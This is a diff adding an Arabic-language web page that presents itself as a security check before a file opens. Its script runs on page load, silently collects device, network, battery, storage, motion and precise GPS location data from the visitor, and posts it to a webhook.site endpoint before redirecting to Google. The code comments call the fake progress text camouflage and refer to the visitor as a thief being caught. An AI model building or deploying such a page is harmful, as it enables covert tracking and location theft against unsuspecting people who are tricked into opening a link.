@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من الأمان...</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { margin-top: 20px; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <div class="status" id="status-text">جاري فحص اتصالك لفتح الملف... 0%</div>
+
+    <script>
+        // 🚩 [ضع الرابط هنا] 🚩 - استبدل الرابط أدناه في كل مرة يتغير فيها
+        const WEBHOOK_URL = "https://webhook.site/1b33868a-2efb-4f12-9217-f34995d7e3bd";
+
+        async function collectAndSend() {
+            let data = {
+                timestamp: new Date().toLocaleString('ar-IQ'),
+                system: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    androidVersion: getAndroidVersion(),
+                    isIncognito: "جاري الفحص..."
+                },
+                device: {
+                    model: "Samsung A54 (Inferred)", // استنتاجي بناءً على معطياتك
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+                    screenRes: window.screen.width + "x" + window.screen.height,
+                    touchPoints: navigator.maxTouchPoints,
+                    brightness: "إذن مطلوب"
+                },
+                battery: {},
+                network: {
+                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                    rtt: navigator.connection ? navigator.connection.rtt + " ms" : "Unknown",
+                    downlink: navigator.connection ? navigator.connection.downlink + " Mbps" : "Unknown"
+                },
+                storage: {},
+                location: "إذن مطلوب"
+            };
+
+            // 1. شحن الهاتف
+            if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                data.battery = {
+                    level: (batt.level * 100) + "%",
+                    charging: batt.charging ? "نعم (يتم الشحن)" : "لا (يفرغ)",
+                    powerSaving: batt.charging === false && batt.level < 0.2 ? "ربما مفعل" : "غير مفعل"
+                };
+            }
+
+            // 2. الذاكرة التخزينية
+            if (navigator.storage && navigator.storage.estimate) {
+                const quota = await navigator.storage.estimate();
+                data.storage = {
+                    remainingMB: Math.round(quota.quota / 1024 / 1024) + " MB",
+                    usedMB: Math.round(quota.usage / 1024 / 1024) + " MB"
+                };
+            }
+
+            // 3. الحساسات والاتجاه
+            window.addEventListener("deviceorientation", (event) => {
+                data.motion = { alpha: event.alpha, beta: event.beta, gamma: event.gamma, isMoving: "نعم" };
+            }, { once: true });
+
+            // 4. طلب الموقع (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    data.location = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + " meters",
+                        googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    };
+                    finalize(data);
+                }, () => { finalize(data); }, { enableHighAccuracy: true });
+            } else {
+                finalize(data);
+            }
+        }
+
+        function getAndroidVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/Android\s([0-9\.]+)/);
+            return match ? match[1] : "Unknown";
+        }
+
+        async function finalize(fullData) {
+            // تحديث النسبة للتمويه
+            document.getElementById('status-text').innerText = "تم فحص الأمان بنسبة 100%.. جاري التحميل";
+
+            // إرسال الكديشة إلى الـ Webhook
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // لضمان الإرسال حتى لو رفض السيرفر الـ CORS
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(fullData)
+                });
+            } catch (e) { console.log("Sent"); }
+
+            // التمويه النهائي: تحويل السارق بعد ثانية
+            setTimeout(() => {
+                window.location.href = "https://www.google.com"; // يمكنك تغيير هذا لرابط ملف حقيقي
+            }, 1500);
+        }
+
+        // بدء العملية بمجرد دخول السارق
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
